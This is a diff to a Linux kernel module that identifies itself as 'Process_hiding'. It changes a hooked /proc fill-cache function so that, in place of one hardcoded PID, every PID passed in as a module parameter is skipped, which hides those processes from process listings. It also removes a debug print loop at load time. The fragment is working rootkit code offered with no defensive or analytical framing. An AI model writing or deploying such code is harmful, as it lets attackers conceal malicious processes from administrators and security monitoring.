@@ -54,19 +54,25 @@ bool fake__proc_fill_cache( struct file *file,
                             struct task_struct *task,
                             const void *ptr )
 {
+    unsigned i;
     struct dentry *child, *dir = file->f_path.dentry;
     struct qstr qname = QSTR_INIT(name, len);
     struct inode *inode;
     unsigned type;
     ino_t ino;
     bool ret;
+    char textbuf[16];
 
     atomic_inc(&active_read_calls);
 
-    if (strcmp(name, "961") == 0)
+    for (i = 0; i < var_count; ++i)
     {
-        ret = true;
-        goto gtfo;
+        snprintf(textbuf, sizeof(textbuf), "%d", pid[i]);
+        if (strcmp(name, textbuf) == 0)
+        {
+            ret = true;
+            goto gtfo;
+        }
     }
 
     child = d_hash_and_lookup(dir, &qname);
@@ -119,12 +125,7 @@ void unhook(void)
 }
 
 int init_module(void){
-    int i;
     printk(KERN_INFO "Process_hiding loaded.\n");
-
-    for (i = 0; i < var_count; ++i){
-        printk("the %dth number is : %d\n", i, pid[i]);
-    }
 
     hook();
 
